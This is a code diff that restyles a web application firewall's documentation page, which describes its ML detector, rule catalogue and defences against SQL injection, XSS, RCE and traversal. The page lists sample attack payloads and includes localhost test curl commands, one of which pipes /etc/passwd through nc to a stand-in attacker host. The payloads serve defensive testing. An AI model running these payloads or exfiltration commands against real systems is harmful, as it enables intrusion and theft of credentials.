                 MDefender Pro's Machine Learning core is engineered to stop polymorphic payloads, zero-day CVE exploits, and obfuscations that evade traditional static signatures.
               </p>
 
               <div style={{
-                background: '#0c1222',
-                border: '1px solid #1e293b',
+                background: t.cardBg,
+                border: t.cardBorder,
                 borderRadius: '12px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 margin: '24px 0'
               }}>
-                <h3 style={{ fontSize: '17px', fontWeight: '700', marginBottom: '12px', color: '#38bdf8' }}>Training Corpus &amp; Dataset Highlights:</h3>
-                <ul style={{ paddingLeft: '20px', fontSize: '13px', lineHeight: '1.8', color: '#94a3b8' }}>
+                <h3 style={{ fontSize: '17px', fontWeight: '700', marginBottom: '12px', color: t.accentText }}>Training Corpus &amp; Dataset Highlights:</h3>
+                <ul style={{ paddingLeft: '20px', fontSize: '13px', lineHeight: '1.8', color: t.muted }}>
                   <li><strong>5,489,242+ Sample Corpus:</strong> Combines HTTP traffic corpora from CSIC 2010, CICIDS2017, OWASP ModSecurity Core Rule Set vectors, and real-world honeypot captures.</li>
                   <li><strong>Character N-Gram Vectorizer:</strong> Analyzes 3-gram to 5-gram token distributions to capture structural syntactic patterns rather than relying on exact keyword substrings.</li>
                   <li><strong>Dual Classifier Output:</strong> Generates a binary attack probability (0.0 to 1.0) and a multi-class threat classifier (SQLi, XSS, RCE, LFI, SSRF, Deserialization).</li>
@@ -658,7 +704,7 @@ curl -i "http://localhost:5000/api/books"`}
                 </ul>
               </div>
 
-              <h3 style={{ fontSize: '18px', fontWeight: '700', marginTop: '30px', marginBottom: '12px' }}>ML Detector Python API</h3>
+              <h3 style={{ fontSize: '18px', fontWeight: '700', marginTop: '30px', marginBottom: '12px', color: t.subheading }}>ML Detector Python API</h3>
               <CodeBlock
                 language="python"
                 code={`from src.engine.ml_detector import MLDetector
@@ -687,28 +733,28 @@ print(result)
           {activeSection === 'ml-vectorizer' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(168, 85, 247, 0.15)', border: '1px solid rgba(168, 85, 247, 0.3)', color: '#c084fc', fontSize: '12px', fontWeight: '700' }}>Feature Extraction</span>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: '#38bdf8', fontSize: '12px', fontWeight: '700' }}>Character 3-to-5 N-Grams</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(168, 85, 247, 0.15)', border: '1px solid rgba(168, 85, 247, 0.3)', color: '#7c3aed', fontSize: '12px', fontWeight: '700' }}>Feature Extraction</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: t.accentText, fontSize: '12px', fontWeight: '700' }}>Character 3-to-5 N-Grams</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Character N-Gram Vectorization</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
-                Traditional word-level tokenizers fail when attackers use comment evasion (e.g. <code>UN/**/ION SEL/**/ECT</code>) or variable renaming. MDefender uses sub-character n-gram decomposition to capture structural anomalies.
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Character N-Gram Vectorization</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
+                Traditional word-level tokenizers fail when attackers use comment evasion (e.g. <code className="doc-inline-code">UN/**/ION SEL/**/ECT</code>) or variable renaming. MDefender uses sub-character n-gram decomposition to capture structural anomalies.
               </p>
 
               <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px', marginBottom: '24px' }}>
-                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
-                  <h4 style={{ color: '#38bdf8', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
+                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
+                  <h4 style={{ color: t.accentText, margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                     <i className="fa-solid fa-scissors" style={{ marginRight: '6px' }}></i> Sub-Word Slicing
                   </h4>
-                  <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
-                    Extracts overlapping character windows of length 3, 4, and 5. A snippet like <code>&lt;scr</code> breaks into <code>['&lt;sc', 'scr', 'crip', 'ript']</code>.
+                  <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
+                    Extracts overlapping character windows of length 3, 4, and 5. A snippet like <code className="doc-inline-code">&lt;scr</code> breaks into <code className="doc-inline-code">['&lt;sc', 'scr', 'crip', 'ript']</code>.
                   </p>
                 </div>
-                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
-                  <h4 style={{ color: '#34d399', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
+                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
+                  <h4 style={{ color: '#059669', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                     <i className="fa-solid fa-weight-scale" style={{ marginRight: '6px' }}></i> TF-IDF Weighting
                   </h4>
-                  <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
+                  <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                     Scales down harmless common English/URL n-grams while amplifying rare syntactic attack tokens with high discriminative entropy.
                   </p>
                 </div>
@@ -735,36 +781,37 @@ vectorizer = TfidfVectorizer(
           {activeSection === 'ml-classification' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', fontSize: '12px', fontWeight: '700' }}>Scoring Engine</span>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#34d399', fontSize: '12px', fontWeight: '700' }}>0-100 Risk Index</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#dc2626', fontSize: '12px', fontWeight: '700' }}>Scoring Engine</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#059669', fontSize: '12px', fontWeight: '700' }}>0-100 Risk Index</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Risk Scoring &amp; Threat Categorization</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Risk Scoring &amp; Threat Categorization</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Every request analyzed by MDefender receives a continuous risk score between 0 and 100 alongside multi-vector classification probabilities.
               </p>
 
               <div style={{
-                background: '#0a0e1a',
-                border: '1px solid #1e293b',
+                background: t.cardBgAlt,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '24px'
               }}>
-                <h3 style={{ fontSize: '16px', fontWeight: '800', color: '#f8fafc', marginBottom: '14px' }}>
+                <h3 style={{ fontSize: '16px', fontWeight: '800', color: t.subheading, marginBottom: '14px' }}>
                   Decision Threshold Matrix
                 </h3>
                 <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
-                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 16px', borderRadius: '8px', background: 'rgba(16,185,129,0.1)', border: '1px solid rgba(16,185,129,0.25)' }}>
-                    <span style={{ color: '#34d399', fontWeight: '700', fontSize: '13px' }}>Score 0 &ndash; 39 (Clean)</span>
-                    <span style={{ color: '#cbd5e1', fontSize: '13px' }}>Pass directly to application &bull; No overhead</span>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 16px', borderRadius: '8px', background: dark ? 'rgba(16,185,129,0.1)' : '#f0fdf4', border: '1px solid #bbf7d0' }}>
+                    <span style={{ color: '#059669', fontWeight: '700', fontSize: '13px' }}>Score 0 &ndash; 39 (Clean)</span>
+                    <span style={{ color: t.body, fontSize: '13px' }}>Pass directly to application &bull; No overhead</span>
                   </div>
-                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 16px', borderRadius: '8px', background: 'rgba(245,158,11,0.1)', border: '1px solid rgba(245,158,11,0.25)' }}>
-                    <span style={{ color: '#fbbf24', fontWeight: '700', fontSize: '13px' }}>Score 40 &ndash; 69 (Suspicious)</span>
-                    <span style={{ color: '#cbd5e1', fontSize: '13px' }}>Logged in telemetry &bull; Rate-limited</span>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 16px', borderRadius: '8px', background: dark ? 'rgba(245,158,11,0.1)' : '#fffbeb', border: '1px solid #fef3c7' }}>
+                    <span style={{ color: '#d97706', fontWeight: '700', fontSize: '13px' }}>Score 40 &ndash; 69 (Suspicious)</span>
+                    <span style={{ color: t.body, fontSize: '13px' }}>Logged in telemetry &bull; Rate-limited</span>
                   </div>
-                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 16px', borderRadius: '8px', background: 'rgba(239,68,68,0.15)', border: '1px solid rgba(239,68,68,0.3)' }}>
-                    <span style={{ color: '#f87171', fontWeight: '800', fontSize: '13px' }}>Score 70 &ndash; 100 (Critical Attack)</span>
-                    <span style={{ color: '#f87171', fontWeight: '700', fontSize: '13px' }}>Blocked immediately with HTTP 403 Cyber Screen</span>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 16px', borderRadius: '8px', background: dark ? 'rgba(239,68,68,0.15)' : '#fef2f2', border: '1px solid #fecaca' }}>
+                    <span style={{ color: '#dc2626', fontWeight: '800', fontSize: '13px' }}>Score 70 &ndash; 100 (Critical Attack)</span>
+                    <span style={{ color: '#dc2626', fontWeight: '700', fontSize: '13px' }}>Blocked immediately with HTTP 403 Cyber Screen</span>
                   </div>
                 </div>
               </div>
@@ -774,63 +821,63 @@ vectorizer = TfidfVectorizer(
           {/* Section: Rules Overview */}
           {activeSection === 'rules-overview' && (
             <div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>2,000 Enterprise WAF Rules Catalog</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '20px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>2,000 Enterprise WAF Rules Catalog</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '20px' }}>
                 MDefender Pro incorporates 2,000 distinct regular expression detection signatures organized across 7 major threat vectors:
               </p>
 
-              <div style={{ overflowX: 'auto', margin: '20px 0' }}>
+              <div style={{ overflowX: 'auto', margin: '20px 0', borderRadius: '12px', border: t.cardBorder, boxShadow: t.cardShadow }}>
                 <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '13px' }}>
                   <thead>
-                    <tr style={{ background: '#0c1222', textAlign: 'left', borderBottom: '1px solid #1e293b' }}>
-                      <th style={{ padding: '12px 14px', color: '#f1f5f9' }}>Category</th>
-                      <th style={{ padding: '12px 14px', color: '#f1f5f9' }}>Rule Count</th>
-                      <th style={{ padding: '12px 14px', color: '#f1f5f9' }}>Key Vectors Covered</th>
-                      <th style={{ padding: '12px 14px', color: '#f1f5f9' }}>Severity</th>
+                    <tr style={{ background: t.tableHeadBg, textAlign: 'left', borderBottom: `1px solid ${t.tableBorder}` }}>
+                      <th style={{ padding: '12px 14px', color: t.heading }}>Category</th>
+                      <th style={{ padding: '12px 14px', color: t.heading }}>Rule Count</th>
+                      <th style={{ padding: '12px 14px', color: t.heading }}>Key Vectors Covered</th>
+                      <th style={{ padding: '12px 14px', color: t.heading }}>Severity</th>
                     </tr>
                   </thead>
                   <tbody>
-                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
-                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>SQL Injection</td>
-                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>350 Rules</td>
-                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>Union Select, Boolean Tautologies, Time delays, Stacked DDL</td>
-                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#f87171', fontWeight: '800' }}>CRITICAL</span></td>
+                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
+                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>SQL Injection</td>
+                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>350 Rules</td>
+                      <td style={{ padding: '12px 14px', color: t.muted }}>Union Select, Boolean Tautologies, Time delays, Stacked DDL</td>
+                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#dc2626', fontWeight: '800' }}>CRITICAL</span></td>
                     </tr>
-                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
-                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>Cross-Site Scripting (XSS)</td>
-                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>350 Rules</td>
-                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>HTML5 tags, 25+ event handlers, DOM Sinks, Obfuscated JS</td>
-                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#f87171', fontWeight: '800' }}>CRITICAL</span></td>
+                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
+                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>Cross-Site Scripting (XSS)</td>
+                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>350 Rules</td>
+                      <td style={{ padding: '12px 14px', color: t.muted }}>HTML5 tags, 25+ event handlers, DOM Sinks, Obfuscated JS</td>
+                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#dc2626', fontWeight: '800' }}>CRITICAL</span></td>
                     </tr>
-                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
-                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>RCE &amp; WebShells</td>
-                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>350 Rules</td>
-                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>Linux binaries, PowerShell, 22+ WebShells, Deserialization</td>
-                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#f87171', fontWeight: '800' }}>CRITICAL</span></td>
+                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
+                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>RCE &amp; WebShells</td>
+                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>350 Rules</td>
+                      <td style={{ padding: '12px 14px', color: t.muted }}>Linux binaries, PowerShell, 22+ WebShells, Deserialization</td>
+                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#dc2626', fontWeight: '800' }}>CRITICAL</span></td>
                     </tr>
-                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
-                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>Directory Traversal / LFI</td>
-                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>250 Rules</td>
-                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>Nested sequences, /etc/passwd, win.ini, PHP stream wrappers</td>
-                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#fbbf24', fontWeight: '800' }}>HIGH</span></td>
+                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
+                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>Directory Traversal / LFI</td>
+                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>250 Rules</td>
+                      <td style={{ padding: '12px 14px', color: t.muted }}>Nested sequences, /etc/passwd, win.ini, PHP stream wrappers</td>
+                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#d97706', fontWeight: '800' }}>HIGH</span></td>
                     </tr>
-                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
-                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>CMS Vulnerabilities</td>
-                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>300 Rules</td>
-                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>WordPress plugins, Laravel .env, Spring4Shell, Log4j</td>
-                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#f87171', fontWeight: '800' }}>CRITICAL</span></td>
+                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
+                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>CMS Vulnerabilities</td>
+                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>300 Rules</td>
+                      <td style={{ padding: '12px 14px', color: t.muted }}>WordPress plugins, Laravel .env, Spring4Shell, Log4j</td>
+                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#dc2626', fontWeight: '800' }}>CRITICAL</span></td>
                     </tr>
-                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
-                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>Bots &amp; Scanners</td>
-                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>200 Rules</td>
-                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>sqlmap, Nikto, Acunetix, DirBuster, scrapers</td>
-                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#fbbf24', fontWeight: '800' }}>HIGH</span></td>
+                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
+                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>Bots &amp; Scanners</td>
+                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>200 Rules</td>
+                      <td style={{ padding: '12px 14px', color: t.muted }}>sqlmap, Nikto, Acunetix, DirBuster, scrapers</td>
+                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#d97706', fontWeight: '800' }}>HIGH</span></td>
                     </tr>
                     <tr>
-                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>SSRF &amp; XXE</td>
-                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>200 Rules</td>
-                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>AWS/GCP metadata, internal subnets, XML External Entities</td>
-                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#f87171', fontWeight: '800' }}>CRITICAL</span></td>
+                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>SSRF &amp; XXE</td>
+                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>200 Rules</td>
+                      <td style={{ padding: '12px 14px', color: t.muted }}>AWS/GCP metadata, internal subnets, XML External Entities</td>
+                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#dc2626', fontWeight: '800' }}>CRITICAL</span></td>
                     </tr>
                   </tbody>
                 </table>
@@ -842,20 +889,20 @@ vectorizer = TfidfVectorizer(
           {activeSection === 'sqli-defense' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', fontSize: '12px', fontWeight: '700' }}>350 Compiled Signatures</span>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: '#38bdf8', fontSize: '12px', fontWeight: '700' }}>OWASP Top 1: A03:2021</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#dc2626', fontSize: '12px', fontWeight: '700' }}>350 Compiled Signatures</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: t.accentText, fontSize: '12px', fontWeight: '700' }}>OWASP Top 1: A03:2021</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>SQL Injection Defense (350 Rules)</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>SQL Injection Defense (350 Rules)</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 MDefender intercepts SQL injection across query parameters, POST JSON, multipart form data, and HTTP header values.
               </p>
-              <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px', marginBottom: '24px' }}>
-                <h4 style={{ color: '#38bdf8', margin: '0 0 10px', fontSize: '15px', fontWeight: '700' }}>Covered SQLi Attack Techniques</h4>
-                <ul style={{ paddingLeft: '20px', fontSize: '13px', color: '#94a3b8', lineHeight: '1.8', margin: 0 }}>
-                  <li><strong>Union-Based Extraction:</strong> Detects <code>UNION ALL SELECT</code>, column balancing, and schema table probing.</li>
-                  <li><strong>Boolean-Based Blind Injections:</strong> Detects tautologies (<code>' OR '1'='1</code>, <code>admin' -- -</code>).</li>
-                  <li><strong>Time-Based Blind Injections:</strong> Detects <code>SLEEP()</code>, <code>pg_sleep()</code>, and <code>WAITFOR DELAY</code>.</li>
-                  <li><strong>Stacked Queries &amp; DDL Injections:</strong> Detects <code>; DROP TABLE</code>, <code>; UPDATE</code>, <code>EXEC master..xp_cmdshell</code>.</li>
+              <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow, marginBottom: '24px' }}>
+                <h4 style={{ color: t.accentText, margin: '0 0 10px', fontSize: '15px', fontWeight: '700' }}>Covered SQLi Attack Techniques</h4>
+                <ul style={{ paddingLeft: '20px', fontSize: '13px', color: t.muted, lineHeight: '1.8', margin: 0 }}>
+                  <li><strong>Union-Based Extraction:</strong> Detects <code className="doc-inline-code">UNION ALL SELECT</code>, column balancing, and schema table probing.</li>
+                  <li><strong>Boolean-Based Blind Injections:</strong> Detects tautologies (<code className="doc-inline-code">' OR '1'='1</code>, <code className="doc-inline-code">admin' -- -</code>).</li>
+                  <li><strong>Time-Based Blind Injections:</strong> Detects <code className="doc-inline-code">SLEEP()</code>, <code className="doc-inline-code">pg_sleep()</code>, and <code className="doc-inline-code">WAITFOR DELAY</code>.</li>
+                  <li><strong>Stacked Queries &amp; DDL Injections:</strong> Detects <code className="doc-inline-code">; DROP TABLE</code>, <code className="doc-inline-code">; UPDATE</code>, <code className="doc-inline-code">EXEC master..xp_cmdshell</code>.</li>
                 </ul>
               </div>
               <CodeBlock language="bash" code={`# Test SQLi Blocking:
@@ -867,19 +914,19 @@ curl -i "http://localhost:5000/api/books?id=1%27%20UNION%20SELECT%20null,passwor
           {activeSection === 'xss-defense' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', fontSize: '12px', fontWeight: '700' }}>350 Compiled Signatures</span>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: '#38bdf8', fontSize: '12px', fontWeight: '700' }}>OWASP Top 3: A03:2021</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#dc2626', fontSize: '12px', fontWeight: '700' }}>350 Compiled Signatures</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: t.accentText, fontSize: '12px', fontWeight: '700' }}>OWASP Top 3: A03:2021</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Cross-Site Scripting (XSS) Defense</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Cross-Site Scripting (XSS) Defense</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Intercepts Reflected, Stored, and DOM-based Cross-Site Scripting payloads before they can execute in client browsers or reach server renderers.
               </p>
-              <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px', marginBottom: '24px' }}>
-                <h4 style={{ color: '#38bdf8', margin: '0 0 10px', fontSize: '15px', fontWeight: '700' }}>Covered XSS Attack Techniques</h4>
-                <ul style={{ paddingLeft: '20px', fontSize: '13px', color: '#94a3b8', lineHeight: '1.8', margin: 0 }}>
-                  <li><strong>Dangerous HTML5 Tags:</strong> <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, <code>&lt;svg onload=...&gt;</code>.</li>
-                  <li><strong>DOM Event Handlers:</strong> Detects 25+ event sinks including <code>onerror</code>, <code>onload</code>, <code>onmouseover</code>, <code>onfocus</code>.</li>
-                  <li><strong>Pseudo-Protocols:</strong> Detects <code>javascript:</code>, <code>vbscript:</code>, and <code>data:text/html;base64,...</code> URI schemes.</li>
+              <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow, marginBottom: '24px' }}>
+                <h4 style={{ color: t.accentText, margin: '0 0 10px', fontSize: '15px', fontWeight: '700' }}>Covered XSS Attack Techniques</h4>
+                <ul style={{ paddingLeft: '20px', fontSize: '13px', color: t.muted, lineHeight: '1.8', margin: 0 }}>
+                  <li><strong>Dangerous HTML5 Tags:</strong> <code className="doc-inline-code">&lt;script&gt;</code>, <code className="doc-inline-code">&lt;iframe&gt;</code>, <code className="doc-inline-code">&lt;object&gt;</code>, <code className="doc-inline-code">&lt;embed&gt;</code>, <code className="doc-inline-code">&lt;svg onload=...&gt;</code>.</li>
+                  <li><strong>DOM Event Handlers:</strong> Detects 25+ event sinks including <code className="doc-inline-code">onerror</code>, <code className="doc-inline-code">onload</code>, <code className="doc-inline-code">onmouseover</code>, <code className="doc-inline-code">onfocus</code>.</li>
+                  <li><strong>Pseudo-Protocols:</strong> Detects <code className="doc-inline-code">javascript:</code>, <code className="doc-inline-code">vbscript:</code>, and <code className="doc-inline-code">data:text/html;base64,...</code> URI schemes.</li>
                 </ul>
               </div>
               <CodeBlock language="bash" code={`# Test XSS Blocking:
@@ -891,10 +938,10 @@ curl -i "http://localhost:5000/api/books?search=%3Cscript%3Ealert(document.cooki
           {activeSection === 'rce-webshells' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', fontSize: '12px', fontWeight: '700' }}>350 Compiled Signatures</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#dc2626', fontSize: '12px', fontWeight: '700' }}>350 Compiled Signatures</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Remote Code Execution &amp; WebShells (350 Rules)</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Remote Code Execution &amp; WebShells (350 Rules)</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Prevents command injection into OS system shells, PowerShell execution, reverse shell pipelines, and PHP backdoor webshells.
               </p>
               <CodeBlock language="bash" code={`# Test RCE Blocking:
@@ -906,10 +953,10 @@ curl -i "http://localhost:5000/api/tools?cmd=;cat%20/etc/passwd|nc%20attacker.co
           {activeSection === 'lfi-traversal' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(245, 158, 11, 0.15)', border: '1px solid rgba(245, 158, 11, 0.3)', color: '#fbbf24', fontSize: '12px', fontWeight: '700' }}>250 Compiled Signatures</span>
